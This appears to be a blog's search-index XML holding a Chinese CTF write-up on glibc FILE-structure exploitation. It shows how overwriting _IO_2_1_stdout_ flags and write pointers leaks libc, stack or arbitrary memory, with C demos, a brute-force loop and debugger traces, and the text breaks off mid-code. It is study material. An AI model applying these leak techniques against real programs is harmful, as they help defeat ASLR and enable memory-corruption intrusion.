<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于stdout的利用</title>
      <link href="/2025/08/21/%E5%85%B3%E4%BA%8Estdout%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2025/08/21/%E5%85%B3%E4%BA%8Estdout%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>复现LilCTF2025，遇到了一点对<code>_IO_2_1_stdout_</code>的利用，于是记录一下关于<code>stdout</code>的利用<br></p><h2 id="0x01-关于stdout"><a href="#0x01-关于stdout" class="headerlink" title="0x01 关于stdout"></a>0x01 关于stdout</h2><p><code>stdout</code>也就是<code>_IO_2_1_stdout_</code><br>在 glibc 里，标准 I&#x2F;O 流 (<code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code>) 都是定义在 <code>libc</code> 的全局变量<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br></pre></td></tr></table></figure><p>这几个其实都是<code>_IO_FILE_plus</code>结构体，其<code>_fileno</code>域分别为1,0,2<br>在程序调用<code>puts</code>函数或者<code>printf</code>函数（标准IO函数）时候，使用的都是<code>_IO_2_1_stdout_</code>这个结构体<br>那么<code>write</code>函数呢？其实<code>write</code>函数只是对系统调用的封装，当你调用 <code>write(1, &quot;hi&quot;, 2)</code>，glibc 内部会直接发起 <code>syscall(SYS_write, 1, buf, 2)</code>，这里并没有对<code>_IO_2_1_stdout_</code>的使用<br>这时候可能又有疑问了，<code>SYS_write</code>不也用到了<code>fd=1</code>这个对应<code>stdout</code>的描述符吗？其实：<code>fd=1</code>是内核的概念。<code>_IO_2_1_stdout_</code> 是用户态 <code>libc</code> 提供的缓冲封装，它里面保存着 <code>fd=1</code>。<br>每个进程都有一个文件描述符表。其中默认固定<code>fd=0</code> → <code>stdin</code>，<code>fd=1</code> → <code>stdout</code>，<code>fd=2</code> → <code>stderr</code><br>通过之前对于<code>_IO_FILE</code>的<a href="https://r3t2.top/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/">学习</a>，我们知道在刷新缓冲区时候，系统会调用<code>write</code>输出<code>fp-&gt;_IO_write_ptr</code>到<code>fp-&gt;_IO_write_base</code>之间的内容，如果我们能修改<code>stdout-&gt;_IO_write_ptr</code>，<code>stdout-&gt;_IO_write_base</code>以及<code>stdout-&gt;_IO_write_end</code>，是不是就能在程序遇到<code>puts</code>函数或者<code>printf</code>函数，或者<code>fflush(stdout)</code>的时候输出我们想要的内容呢？<br></p><h2 id="0x02-stdout的利用"><a href="#0x02-stdout的利用" class="headerlink" title="0x02 stdout的利用"></a>0x02 stdout的利用</h2><p>单纯的设置<code>write</code>三元组肯定是不行的，还需要满足一些检查（具体输出流程在<a href="https://r3t2.top/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/">前面一篇博客</a>的<code>fwrite</code>部分有分析，而具体相关的检查源码请移步glibc源码），总结一下还需要:<br>设置<code>_flags &amp; _IO_NO_WRITES = 0</code>，设置<code>_flags &amp; _IO_CURRENTLY_PUTTING = 1</code>，设置<code>_flags &amp; _IO_IS_APPENDING = 1</code><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000           <span class="comment">/* Magic number 文件结构体的魔数，用于标识文件结构体的有效性 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800    <span class="comment">/* Currently putting 当前正在执行 put 操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000        <span class="comment">/* Is appending 处于附加模式（在文件末尾追加内容） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8                <span class="comment">/* Writing not allowed 不允许写入操作 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2               <span class="comment">/* Unbuffered 无缓冲模式，直接进行I/O操作，不使用缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200             <span class="comment">/* Line buffered 行缓冲模式，在输出新行时刷新缓冲区 */</span></span></span><br></pre></td></tr></table></figure><p>于是我们一般直接设置<code>_flags</code>为<code>0xfbad1800</code>即可满足，然后设置<code>_IO_write_base</code>指向想要泄露的位置，<code>_IO_write_ptr</code>指向泄露结束的地址，<code>_IO_write_end</code>要么不修改，要么修改成等于<code>_IO_write_ptr</code>，具体见<strong>0x03</strong>部分<br>有哪些利用呢？<br></p><h4 id="leak-libc-base"><a href="#leak-libc-base" class="headerlink" title="leak libc_base"></a>leak libc_base</h4><p>既然我们想要leak libc_base，那么我们肯定是不知道<code>_IO_2_1_stdout_</code>的地址的，这怎么利用呢？<br>在堆利用中，想要泄露libc很多时候绕不开<code>main_arena</code>，在libc中<code>main_arena</code>与<code>stdout</code>的地址是十分接近的<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdout</span><br><span class="line">$1 = (FILE *) 0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; p &amp;main_arena</span><br><span class="line">$2 = (struct malloc_state *) 0x7ffff7e1ac80 &lt;main_arena&gt;</span><br></pre></td></tr></table></figure><p>可以看到这里只有低两字节不一样，但在<code>ASLR</code>保护机制（仍然页对齐）影响下，这里低两字节中的最高位数会随机化，只有低三位（16进制下）仍然已知固定，我们可以修改指向<code>main_arena</code>的指针的低两字节，对于随机的那一位（16进制下）我们进行爆破即可（16种可能）<br>既然在打<code>stdout</code>泄露libc，说明我们收到限制，不能简单的直接查<code>unnsortedbin</code>中的chunk（不然直接<code>unsortedbin leak</code>即可），我们就需要将<code>unsortedbin</code>中chunk的fd指针也放到<code>tcache</code>或者<code>fastbin</code>中（通过具体的漏洞利用使得同一个chunk既在<code>unsortedbin</code>上，也在<code>tcache</code>或者<code>fastbin</code>上），这样我们在<code>tcache</code>或者<code>fastbin</code>中就存在一个chunk的<code>fd</code>指向<code>main_arena</code>，我们修改其低两字节，爆破随机的那1bit，就能申请到<code>stdout</code>了<br>如果是利用<code>fastbin</code>的话，我们一般利用<code>stdout-0x43</code>这个地址，我们看<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/6gx 0x7ffff7e1b780 - 0x43</span><br><span class="line">0x7ffff7e1b73d &lt;_IO_2_1_stderr_+157&gt;:   0xfff7e1a8a0000000      0x000000000000007f</span><br><span class="line">0x7ffff7e1b74d &lt;_IO_2_1_stderr_+173&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7e1b75d &lt;_IO_2_1_stderr_+189&gt;:   0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>正好错位形成一个size域为<code>0x7f</code>的chunk，当然错位<code>fastbin</code>的手法一般在低版本，高版本更多直接打<code>tcache</code><br>摘取一个简单的爆破模版<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = process(file)</span><br><span class="line">            exp()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>在申请到<code>stdout</code>后我们覆盖其<code>_IO_write_base</code>的最低字节为<code>\x00</code>，这样在输出时候就能leak出一个libc地址<br></p><h4 id="leak-stack-addr"><a href="#leak-stack-addr" class="headerlink" title="leak stack addr"></a>leak stack addr</h4><p>直接打<code>stdout</code>输出<code>environ</code>值即可泄露栈地址，具体leak手法见<a href="https://r3t2.top/2025/07/07/malloc%E4%BD%8D%E4%BA%8E%E6%A0%88%E4%B8%8A%E7%9A%84chunk/">malloc位于栈上的chunk | r3t2’s blog</a><br></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>除了leak上面两个地址，我们利用<code>stdout</code>可以实现任意地址读，只需要具体情况具体利用即可<br></p><h2 id="0x03-动手看看"><a href="#0x03-动手看看" class="headerlink" title="0x03 动手看看"></a>0x03 动手看看</h2><p>我们根据不同缓冲模式来调试demo<br></p><h4 id="无缓冲"><a href="#无缓冲" class="headerlink" title="无缓冲"></a>无缓冲</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>); <span class="comment">//无缓冲</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf addr is --&gt; %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">    <span class="type">uint64_t</span> printf_addr = (<span class="type">uint64_t</span>)&amp;<span class="built_in">printf</span>;</span><br><span class="line">    <span class="type">uint64_t</span> stdout_addr = printf_addr + <span class="number">0x1bb090</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stdout addr is --&gt; %p\n&quot;</span>, stdout_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- input &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, victim, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- leak  &gt;&gt;&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">int</span>*)stdout_addr = <span class="number">0xfbad1802</span>; <span class="comment">//无缓冲 0xfbad1800|0x2</span></span><br><span class="line"></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">1</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_ptr</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_end</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">3</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">4</span>] = (<span class="type">uint64_t</span>)victim;           <span class="comment">// _IO_write_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">5</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_ptr  必须大于 base 才会写出</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">6</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_end = ptr </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new_data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们输入”leakleakleakleak“，运行直到<code>puts</code>前，可以看到<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *stdout</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _flags = -72542208,</span><br><span class="line">  _IO_read_ptr = 0x0,</span><br><span class="line">  _IO_read_end = 0x0,</span><br><span class="line">  _IO_read_base = 0x0,</span><br><span class="line">  _IO_write_base = 0x5555555592a0 &quot;leakleakleakleak&quot;,</span><br><span class="line">  _IO_write_ptr = 0x5555555592b0 &quot;&quot;,</span><br><span class="line">  _IO_write_end = 0x5555555592b0 &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7e1b803 &lt;_IO_2_1_stdout_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_end = 0x7ffff7e1b804 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x7ffff7e1aaa0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">  _fileno = 1,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = -1,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x7ffff7e1ca70 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x7ffff7e1a9a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = -1,</span><br><span class="line">  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>stdout</code>被我们设置好，然后我们步入<code>puts</code>查看流程<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c80e50 &lt;puts&gt;       endbr64</span><br><span class="line">0x7ffff7c8b600 &lt;_IO_file_xsputn&gt;       endbr64</span><br><span class="line">0x7ffff7c8cdc0 &lt;_IO_file_overflow&gt;       endbr64</span><br><span class="line">0x7ffff7c8c930 &lt;_IO_do_write&gt;             endbr64</span><br><span class="line">0x7ffff7c8aec0 &lt;_IO_file_write&gt;       endbr64</span><br><span class="line">0x7ffff7d14870 &lt;write&gt;       endbr64</span><br><span class="line">0x7ffff7d14885 &lt;write+21&gt;    syscall  &lt;SYS_write&gt;</span><br></pre></td></tr></table></figure><p>因为设置了<code>_IO_write_end = _IO_write_ptr</code>，也就是会先触发一次overflow刷新<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">puts</span><br><span class="line">  → _IO_file_xsputn</span><br><span class="line">    → _IO_file_overflow</span><br><span class="line">      → _IO_do_write</span><br><span class="line">        → _IO_file_write</span><br><span class="line">          → write</span><br><span class="line">            → syscall(SYS_write)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里具体流程在此前对<code>fwrite</code>已经分析过，这一流程后续就不重复放了，最后我们看运行结果<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt; leakleakleakleak</span><br><span class="line">---- leak  &gt;&gt;&gt; leakleakleakleaknew_data</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="行缓冲"><a href="#行缓冲" class="headerlink" title="行缓冲"></a>行缓冲</h4><p>然后我们看行缓冲下，将<code>_flags</code>设置为<code>0xfbad1a00</code>（<code>0xfbad1800|0x200</code>），并设置<code>_IO_write_end &gt; _IO_write_ptr</code><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">//行缓冲</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf addr is --&gt; %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">    <span class="type">uint64_t</span> printf_addr = (<span class="type">uint64_t</span>)&amp;<span class="built_in">printf</span>;</span><br><span class="line">    <span class="type">uint64_t</span> stdout_addr = printf_addr + <span class="number">0x1bb090</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stdout addr is --&gt; %p\n&quot;</span>, stdout_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- input &gt;&gt;&gt;\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, victim, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- leak  &gt;&gt;&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">int</span>*)stdout_addr = <span class="number">0xfbad1a00</span>; <span class="comment">// 0xfbad1800|0x200</span></span><br><span class="line"></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">1</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_ptr</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_end</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">3</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">4</span>] = (<span class="type">uint64_t</span>)victim;           <span class="comment">// _IO_write_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">5</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_ptr  必须大于 base 才会写出</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">6</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x100</span>;    <span class="comment">// _IO_write_end &gt; ptr </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new_data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里程序无输出，直到exit后才触发刷新<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">a</span><br><span class="line">new_data</span><br><span class="line">[Inferior 1 (process 55881) exited normally</span><br></pre></td></tr></table></figure><p>这是为什么？这时候我们如果将<code>_IO_write_end</code>设置与<code>_IO_write_ptr</code>相等，则<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">6</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_end == _IO_write_ptr</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">new_data</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br></pre></td></tr></table></figure><p>可以看到<code>puts(&quot;new_data&quot;)</code>成功刷新了输出<br>而如果我们不设置<code>_IO_write_end</code><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//((uint64_t*)stdout_addr)[6] = (uint64_t)victim + 0x100;    // _IO_write_end</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">c</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line">c</span><br><span class="line">new_data</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br></pre></td></tr></table></figure><p>可以看到输出也没问题<br>这里推测是我们如果修改<code>_IO_write_end</code>，会导致<code>stdout</code>的缓冲区异常，要么就不设置。如果设置的话则应使<code>_IO_write_end</code>&#x3D;&#x3D;<code>_IO_write_ptr</code>，会先一步触发<code>overflow</code>，然后程序会重新分配<code>write</code>三元组指针，后续输出操作也就不会出问题<br></p><h4 id="全缓冲"><a href="#全缓冲" class="headerlink" title="全缓冲"></a>全缓冲</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf addr is --&gt; %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">    <span class="type">uint64_t</span> printf_addr = (<span 